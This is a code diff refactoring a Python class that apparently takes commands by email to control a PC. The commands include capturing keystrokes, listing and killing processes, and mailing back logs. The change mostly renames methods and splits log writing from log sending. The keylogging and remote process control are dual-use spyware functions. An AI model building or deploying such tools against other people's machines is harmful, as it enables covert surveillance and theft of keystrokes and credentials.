@@ -71,7 +71,7 @@ class Mail:
             self.email_message.attach(picture_attachment)
 
     def keylogger(self):
-        self.attachment, duration = logger(self.cmd_list)
+        self.attachment, duration = key_logger(self.cmd_list)
         self.set_info("Keylog")
 
         self.body = (
@@ -146,11 +146,11 @@ class Mail:
         self.body = kill_process(self.cmd_list[1])
         self.email_message.attach(MIMEText(self.body, "plain"))
 
-    def log(self):
-        file_path = note2log(self.sender, self.cmd_list, self.attachment, self.body)
+    def send_log(self):
+        file_path = "Files\\mail.log"
         self.set_info("Log File")
 
-        self.body = "The program's log file of your PC."
+        self.body = "Program's log file."
         self.email_message.attach(MIMEText(self.body, "plain"))
 
         with open(file_path, "r") as text_file:
@@ -175,7 +175,7 @@ class Mail:
             "listApp": [self.list_app, "list running applications"],
             "listProcess": [self.list_process, "list running processes"],
             "terminateProcess": [self.terminate_process, "terminate a process"],
-            "log": [self.log, "get the log file of your PC"],
+            "log": [self.send_log, "get the log file of your PC"],
             "help": [self.help, "get the list of commands"],
         }
 
@@ -185,6 +185,9 @@ class Mail:
             except Exception:
                 print(f"ERROR: Cannot {command[self.cmd_list[0]][1]}")
 
+    def write_log(self):
+        note2log(self.sender, self.cmd_list, self.attachment, self.body)
+    
     def set_info(self, message: str):
         self.email_message = MIMEMultipart()
         self.email_message["From"] = USERNAME
@@ -209,7 +212,7 @@ class Mail:
                 # print(self.cmd_list)
                 self.process_command()
                 
-                self.log()
+                self.write_log()
                 self.send_mail()
                 self.refresh()
                 
